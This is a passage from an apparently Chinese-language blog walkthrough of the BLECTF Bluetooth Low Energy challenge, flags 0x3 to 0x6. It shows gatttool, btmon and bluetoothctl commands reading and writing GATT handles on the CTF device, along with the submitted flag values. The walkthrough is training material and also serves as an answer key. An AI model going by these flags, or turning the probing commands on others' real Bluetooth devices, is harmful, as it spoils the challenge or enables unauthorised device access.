class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002e|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">d205303e099ceff44835</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:2 /20</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>%% 查看 handle 0x0030 的 ascii 值。按照它告诉你的去做，并将你找到的标志提交给 0x002c %%</p><p>按照之前的思路来读取句柄值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0030|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>要求是设备的md5值（MD5 of Device Name）<br>接下来的步骤除了转换md5值就和0x2一样了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo -n &quot;BLECTF&quot; |md5sum</span><br><span class="line">5cd56d74049ae40f442ece036c6f4f06  -     </span><br></pre></td></tr></table></figure><p>需要注意的是，这里只需要传入前20个字符，后续的操作也是这样的，只要前20个字符，并且依旧遵循“如果您使用的是 gatttool，请确保使用 xxd 将其转换为十六进制。”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;5cd56d74049ae40f442e&quot;|xxd -ps)</span><br></pre></td></tr></table></figure><p>成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0030|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">MD5 of Device Name</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo -n &quot;BLECTF&quot; |md5sum</span><br><span class="line">5cd56d74049ae40f442ece036c6f4f06  -</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;5cd56d74049ae40f442e&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:3 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x4-查找指定的句柄"><a href="#0x4-查找指定的句柄" class="headerlink" title="0x4 查找指定的句柄"></a>0x4 查找指定的句柄</h2><p>%% 蓝牙 GATT 服务提供了一些额外的设备属性。尝试查找 Generic Access -&gt; Device Name 的值。 %%</p><h3 id="查找值"><a href="#查找值" class="headerlink" title="查找值"></a>查找值</h3><p>在<a class="link"   href="https://www.bluetooth.com/specifications/assigned-numbers/" >官网<i class="fas fa-external-link-alt"></i></a>就可以查到具体的UUID值，ctrl+f搜索Device Name就可以得到0x2A00,使用-u 来指定uuid就可以对Device Name进行读取<br>BLE的属性类型是有限的，有四个大类：</p><ul><li>Primary Service（首要服务项）</li><li>Secondary Service（次要服务项）</li><li>Include（包含服务项）</li><li>Characteristic（特征值）<br>也可以进行手动排查<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找出设备提供哪些顶层服务及其范围</span></span><br><span class="line">gatttool -b 64:B7:08:61:B9:7E --primary</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分区查找特征值</span></span><br><span class="line">gatttool -b 64:B7:08:61:B9:7E --characteristics -s 0x0001 -e 0x0007</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接查找全部特征值</span></span><br><span class="line">gatttool -b 64:B7:08:61:B9:7E --characteristics  </span><br></pre></td></tr></table></figure>结果如下<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --primary</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">attr handle = 0x0001, end grp handle = 0x0005 uuid: 00001801-0000-1000-8000-00805f9b34fb</span><br><span class="line">attr handle = 0x0014, end grp handle = 0x001c uuid: 00001800-0000-1000-8000-00805f9b34fb</span><br><span class="line">attr handle = 0x0028, end grp handle = 0xffff uuid: 000000ff-0000-1000-8000-00805f9b34fb</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics -s 0x0014 -e 0x001c</span><br><span class="line">handle = 0x0015, char properties = 0x02, char value handle = 0x0016, uuid = 00002a00-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle = 0x0017, char properties = 0x02, char value handle = 0x0018, uuid = 00002a01-0000-1000-8000-00805f9b34fb</span><br><span class="line">handle = 0x0019, char properties = 0x02, char value handle = 0x001a, uuid = 00002aa6-0000-1000-8000-00805f9b34fb</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>在另一个窗口开启btmon<br>在btmon日志里得到uuid和句柄，可以看到<code>Value Handle: 0x0016 Value UUID: Device Name (0x2a00)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gatttool[117489]: &lt; ACL Data..X flags 0x00 dlen 11  #1573 [hci0] 23271.388417</span><br><span class="line">      ATT: Read By Type Request (0x08) len 6</span><br><span class="line">        Handle range: 0x0014-0x001c</span><br><span class="line">        Attribute type: Characteristic (0x2803)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HCI Event: Number of Completed... (0x13) plen 5  <span class="comment">#1574 [hci0] 23271.428098</span></span></span><br><span class="line">        Num handles: 1</span><br><span class="line">        Handle: 71 Address: 64:B7:08:61:B9:7E (Espressif Inc.)</span><br><span class="line">        Count: 1</span><br><span class="line">        #1573: len 11 (2 Kb/s)</span><br><span class="line">        Latency: 39 msec (39-39 msec ~39 msec)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ACL Data RX: Handle 71 flags 0x02 dlen 27        <span class="comment">#1575 [hci0] 23271.475504</span></span></span><br><span class="line">      ATT: Read By Type Response (0x09) len 22</span><br><span class="line">        Attribute data length: 7</span><br><span class="line">        Attribute data list: 3 entries</span><br><span class="line">        Handle: 0x0015</span><br><span class="line">        Value[5]: 021600002a</span><br><span class="line">            Properties: 0x02</span><br><span class="line">              Read (0x02)</span><br><span class="line">            Value Handle: 0x0016</span><br><span class="line">            Value UUID: Device Name (0x2a00)</span><br><span class="line">        Handle: 0x0017</span><br><span class="line">        Value[5]: 021800012a</span><br><span class="line">            Properties: 0x02</span><br><span class="line">              Read (0x02)</span><br><span class="line">            Value Handle: 0x0018</span><br><span class="line">            Value UUID: Appearance (0x2a01)</span><br><span class="line">        Handle: 0x0019</span><br><span class="line">        Value[5]: 021a00a62a</span><br><span class="line">            Properties: 0x02</span><br><span class="line">              Read (0x02)</span><br><span class="line">            Value Handle: 0x001a</span><br><span class="line">            Value UUID: Central Address Resolution (0x2aa6)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用–characteristics 会有很多输出，这个时候可以对其进行过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查找所有特征值</span></span><br><span class="line">gatttool -b 64:B7:08:61:B9:7E --characteristics </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 btmon 并寻找和目标（Device Name)有关的请求和响应</span></span><br><span class="line">sudo btmon | grep -A 5 -B 5 -i &#x27;Device Name&#x27; </span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo btmon | grep -A 5 -B 5 -i &#x27;Device Name&#x27;   </span><br><span class="line">        Handle: 0x0015</span><br><span class="line">        Value[5]: 021600002a</span><br><span class="line">            Properties: 0x02</span><br><span class="line">              Read (0x02)</span><br><span class="line">            Value Handle: 0x0016</span><br><span class="line">            Value UUID: Device Name (0x2a00)</span><br><span class="line">        Handle: 0x0017</span><br><span class="line">        Value[5]: 021800012a</span><br><span class="line">            Properties: 0x02</span><br><span class="line">              Read (0x02)</span><br><span class="line">            Value Handle: 0x0018</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="进行读取"><a href="#进行读取" class="headerlink" title="进行读取"></a>进行读取</h3><p>从句柄来读取<br><code>-a</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>从uuid来读<br><code>-u</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00 | awk -F&#x27;value: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p ; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>结果如下，可以看到此次读取中-a和-u的结果是不一样的<br>虽然<code>0x2A00</code>对应Device Name，但设备可能将多个特性映射到同一UUID，导致实际访问的特性与预期不符。使用<code>-u</code>参数时，部分蓝牙栈实现可能默认读取固定长度（如20字节），而<code>-a</code>参数直接读取全部数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">2b00042f7481c7b056c4b410d28f33cf</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00 | awk -F&#x27;value: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p ; printf &#x27;\n&#x27;</span><br><span class="line">2b00042f7481c7b056c</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -u 0x2a00</span><br><span class="line">handle: 0x0016   value: 32 62 30 30 30 34 32 66 37 34 38 31 63 37 62 30 35 36 63 </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0016</span><br><span class="line">Characteristic value/descriptor: 32 62 30 30 30 34 32 66 37 34 38 31 63 37 62 30 35 36 63 34 62 34 31 30 64 32 38 66 33 33 63 66 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以在此次提交中我们使用-a读取到的值（记住此次提交也是提交前20个字符，使用 xxd 将其转换为十六进制）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;2b00042f7481c7b056c4&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:4 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x5交互性验证"><a href="#0x5交互性验证" class="headerlink" title="0x5交互性验证"></a>0x5交互性验证</h2><p>%% 读取句柄 0032 并按照它所说的去做。请注意，它并没有像以前那样告诉你写入标志句柄。找到标志后，请继续将其写入您在过去标志中使用的标志句柄。 %%</p><p>读取句柄</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>在0x002c写入任意值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;123&quot;|xxd -ps)</span><br></pre></td></tr></table></figure><p>之后再读取0x003c值就会发生变化，将这个变化的值再填入0x002c就成功了<br>结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write anything here</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;123&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0032|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">3873c0270763568cf7aa</span><br><span class="line">  </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;3873c0270763568cf7aa&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:5 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x6-写入ascii值"><a href="#0x6-写入ascii值" class="headerlink" title="0x6 写入ascii值"></a>0x6 写入ascii值</h2><p>%% 按照读取 handle 0x0034 中的说明进行作。请记住，有些工具只写入十六进制值，而其他工具提供写入十六进制或 ASCII 的方法 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>“Write the ascii value “yo” here”<br>要求写入ascii值(yo对应的十六进制是0x79 0x6f)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n $(echo -n &quot;yo&quot;|xxd -ps)</span><br></pre></td></tr></table></figure><p>再次查看0x0034的值会发现它出现了变化，将新的值写入0x002c</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the ascii value &quot;yo&quot; here</span><br><span class="line">   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796f</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">c55c6314b3db0a6128af</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;c55c6314b3db0a6128af&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:6 /20</span><br><span class="line">   </span><br></pre></td></tr></table></figure><p>关于这题，如果想尝试不同的写入方法可以像这样修改0x0034的值<br>只要把0x0034的值改成不是”yo”，它就会显示最初的提示语了“Write the ascii value “yo” he”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">c55c6314b3db0a6128af</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796g</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the ascii value &quot;yo&quot; he</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-gatttool"><a href="#1-gatttool" class="headerlink" title="1.gatttool"></a>1.gatttool</h3><p>使用十六进制直接写入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n 796f</span><br></pre></td></tr></table></figure><p>在线转换</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0034 -n $(echo -n &quot;yo&quot;|xxd -ps)</span><br></pre></td></tr></table></figure><h3 id="2-bluetoothctl"><a href="#2-bluetoothctl" class="headerlink" title="2.bluetoothctl"></a>2.bluetoothctl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo bluetoothctl</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进行连接</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入操作菜单</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">menu gatt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前句柄</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">list-attributes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">若有目标句柄，则选中</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">select-attribute 0x0034</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">尝试写入；新版本的bluetoothctl是可以直接写入的，如果不行那么写入十六进制形式</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">write <span class="string">&quot;yo&quot;</span></span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">write <span class="string">&quot;0x79 0x6f&quot;</span></span></span><br></pre></td></tr></table></figure><p>我使用bluetoothctl时找不到句柄0x0034，所以无法使用这种方法进行写入,这是list的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">list-attributes</span></span><br><span class="line">Primary Service (Handle 0x0001)</span><br><span class="line">        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0001</span><br><span class="line">        00001801-0000-1000-8000-00805f9b34fb</span><br><span class="line">        Generic Attribute Profile</span><br><span class="line">        ...</span><br><span class="line">        Characteristic (Handle 0x0033)</span><br><span class="line">        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033</span><br><span class="line">        0000ff06-0000-1000-8000-00805f9b34fb</span><br><span class="line">        Unknown</span><br><span class="line">Characteristic (Handle 0x0035)</span><br><span class="line">        /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0035</span><br><span class="line">        0000ff07-0000-1000-8000-00805f9b34fb</span><br><span class="line">        Unknown</span><br><span class="line">    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x0034是一个非标准或 CTF 特定的隐藏句柄，标准发现工具 bluetoothctl 无法看到，但可以直接操作的 gatttool -a 可以访问。</p><ul><li><strong>gatttool -a 的行为:</strong> <code>gatttool --char-read -a &lt;handle&gt;</code> 和 <code>--char-write-req -a &lt;handle&gt;</code> 直接作用于<strong>任何</strong>你指定的句柄，不管它代表服务、特征声明、特征值还是描述符。只要该句柄存在且具有相应的读&#x2F;写权限，gatttool 就能直接与之交互。</li></ul><p>进行验证：<br>使用0x4中查找指定值的方法我找到了0x0034</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --characteristics   </span><br><span class="line">...</span><br><span class="line">handle = 0x0033, char properties = 0x0a, char value handle = 0x0034, uuid = 0000ff06-0000-1000-8000-00805f9b34fb</span><br><span class="line">...</span><br><span 